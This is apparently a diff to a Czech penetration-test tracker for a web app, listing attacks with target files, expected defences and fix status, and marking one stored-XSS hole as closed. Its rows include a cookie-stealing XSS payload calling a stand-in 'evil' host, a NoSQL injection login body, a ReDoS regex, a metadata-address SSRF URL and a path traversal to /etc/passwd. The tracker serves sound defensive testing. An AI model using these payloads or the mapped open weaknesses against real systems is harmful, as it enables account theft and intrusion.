@@ -11,7 +11,7 @@
 
 | P | PT-ID | Útok | Cíl (soubor:řádek) | Očekávaná obrana | Styl | T | Stav |
 |---|---|---|---|---|---|---|---|
-| P0 | PT-36a | Stored XSS: `pages` `table.title:"<img src=x onerror=fetch('//evil/?c='+document.cookie)>"` → střelí u KAŽDÉHO diváka vč. PJ/Admin = krádež cookie/účtu | `PATCH /worlds/:id/pages`; sink `PageSidebar.tsx:98`; `sanitizeTable` `pages.service.ts:54` NEsanitizuje `title` | `sanitizeTable` i na `title` | 36 | T1 | 🔴 it.failing |
+| P0 | PT-36a | Stored XSS: `pages` `table.title:"<img src=x onerror=fetch('//evil/?c='+document.cookie)>"` → střelí u KAŽDÉHO diváka vč. PJ/Admin = krádež cookie/účtu | `PATCH /worlds/:id/pages`; sink `PageSidebar.tsx:98`; `sanitizeTable` `pages.service.ts:54` | `sanitizeTable` i na `title` | 36 | T1 | 🟢 **ZAVŘENO** (fix+test `e68eb43`) |
 | P0 | PT-35a | 2FA brute: znám heslo, `code:"000000".."999999"`; challenge se jen `peek` (nespotřebuje), 0 čítač, jen IP throttle → rotace IP | `POST /auth/login/totp` `auth.service.ts:262-320`, `totp.service.ts:120` | Lockout challenge+účtu po N | 35 | T1 | 🔴 it.failing |
 | P0 | PT-35e | Stale role: demotovaný Admin (JWT `role:Admin`) čte cizí private svět; `OptionalJwtAuthGuard` NEobnovuje roli z DB → bypass do expirace (3 dny) | `GET /worlds/:id`; `optional-jwt-auth.guard.ts:22-32` vs `jwt-auth.guard.ts:69` | Optional guard bere roli z DB | 35 | T1 | 🔴 it.failing |
 | P0 | PT-39b | Freemium cap TOCTOU: paralelně N× `join` → každý čte `countActiveWorldsForUser` PŘED zápisem → všechny projdou | `POST /worlds/:id/join` `worlds.service.ts:816` | Atomický cap (unique/tx) | 39 | T1 | 🔴 it.failing |
@@ -24,8 +24,8 @@
 | P0 | PT-5a | Forced-logout CSRF: cross-site `POST /auth/logout` (simple request, `credentials:include`), cookie `SameSite=None` | `auth.controller.ts:197`, `auth-cookie.ts:34` | CSRF token / custom-header | 5 | T1 | 🔴 it.failing (nízká záv.) |
 | P1 | PT-32a | SSRF world export: `imageUrl=http://169.254.169.254/...` → interní bajty do ZIP | `media-url.guard.ts:22` +25MB cap | origin-allowlist https+cloudinary | 32 | T1 | 🟢 pin (17 case) + 📋 e2e |
 | P1 | PT-36b/c/d | `content/text/customData: "<script>…"` do stránky/timeline/novin | `sanitize-rich-text.ts:21`, `timeline.service.ts:97`, `pages.service.ts:70` | strikt allowlist zahodí `<script>`/`on*` | 36 | T1 | 🟢 pin (napsat) |
-| P1 | PT-22a | NoSQL op injection: login `{"identifier":{"$gt":""},"password":{"$gt":""}}` | `login.dto.ts:9` `@IsString`+ValidationPipe | whitelist+forbidNonWhitelisted → 400 | 22 | T1 | 🟢 pin (napsat) |
-| P1 | PT-22b/c | ReDoS: `?q=(a+)+$` do Mongo `$regex` (user/chat/campaign search) | `escape-regex.ts:7`, `users.repository:296`, `chat-message.repository:62` | escape metaznaků → literál | 22 | T1 | 🟢 pin (napsat) |
+| P1 | PT-22a | NoSQL op injection: login `{"identifier":{"$gt":""},"password":{"$gt":""}}` | `login.dto.ts:9` `@IsString`+ValidationPipe | whitelist+forbidNonWhitelisted → 400 | 22 | T1 | 🟢 pin (test `e68eb43`) |
+| P1 | PT-22b/c | ReDoS: `?q=(a+)+$` do Mongo `$regex` (user/chat/campaign search) | `escape-regex.ts:7`, `users.repository:296`, `chat-message.repository:62` | escape metaznaků → literál | 22 | T1 | 🟢 pin (test `e68eb43`) |
 | P1 | PT-10a | Upload `evil.svg` (`image/svg+xml`, `<script>`) | `upload.service.ts:22,44` whitelist | SVG mimo whitelist → 415 | 10 | T1 | 🟢 pin (napsat) |
 | P1 | PT-10b | MIME spoof: JS tělo jako `image/png` | `assertMagicBytes` `upload.service.ts:60-93` | signatura `89 50 4E 47` → 415 | 10 | T1 | 🟢 pin (napsat) |
 | P1 | PT-10d | Path traversal `.../static/../../etc/passwd` do delete | `deleteLocalImageByUrl:704` guard `:713` | `startsWith(root+sep)` | 10 | T1 | 🟢 pin (napsat) |
